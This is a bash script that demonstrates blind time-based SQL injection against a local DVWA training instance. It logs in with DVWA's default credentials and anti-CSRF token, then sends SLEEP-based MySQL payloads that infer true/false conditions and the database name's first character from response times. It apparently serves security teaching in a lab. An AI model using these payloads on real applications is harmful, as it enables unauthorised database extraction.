#!/usr/bin/env bash
# sqli_time_test.sh
# Demonstrates a BLIND TIME-BASED SQL injection against DVWA from the terminal,
# so the delay is visible as exact seconds (cleaner evidence than the browser).
#
# It (1) logs in to DVWA handling the anti-CSRF token, then (2) sends true/false
# conditions and prints each response time. A ~3s response = TRUE, instant = FALSE.
#
# Usage:  bash tools/sqli_time_test.sh
set -euo pipefail

BASE="http://127.0.0.1:4280"          # DVWA, loopback only
JAR="$(mktemp)"                        # temporary cookie jar for our session
trap 'rm -f "$JAR"' EXIT

# --- 1) Authenticate -------------------------------------------------------
# DVWA's login form carries a hidden anti-CSRF "user_token" (an MD5 = 32 hex
# chars). We must read it from the login page and send it back, or login fails.
TOKEN=$(curl -s -c "$JAR" "$BASE/login.php" \
        | grep -o "user_token' value='[0-9a-f]*'" | grep -o "[0-9a-f]\{32\}")

curl -s -b "$JAR" -c "$JAR" -L \
  --data-urlencode "username=admin" \
  --data-urlencode "password=password" \
  --data-urlencode "user_token=$TOKEN" \
  --data-urlencode "Login=Login" \
  "$BASE/login.php" -o /dev/null
echo "Logged in to DVWA (session established)."

# --- 2) Fire timed payloads ------------------------------------------------
# We pass security=low as a cookie so DVWA serves the low-security code path.
probe() {                 # $1 = human label, $2 = SQLi payload for the id param
  printf "\n%s\n  payload: %s\n" "$1" "$2"
  curl -s -b "$JAR" -b "security=low" -o /dev/null \
       -w "  response time: %{time_total}s\n" \
       --get --data-urlencode "id=$2" --data-urlencode "Submit=Submit" \
       "$BASE/vulnerabilities/sqli_blind/"
}

probe "FALSE condition (expect instant):"              "1' AND IF(1=2, SLEEP(3), 0) #"
probe "TRUE  condition (expect ~3s):"                  "1' AND IF(1=1, SLEEP(3), 0) #"
probe "Is 1st char of database name 'd'? (true->3s):"  "1' AND IF(substring(database(),1,1)='d', SLEEP(3), 0) #"
probe "Is 1st char of database name 'x'? (false->fast):" "1' AND IF(substring(database(),1,1)='x', SLEEP(3), 0) #"

echo
echo "Interpretation: ~3s means the injected condition was TRUE; instant means FALSE."
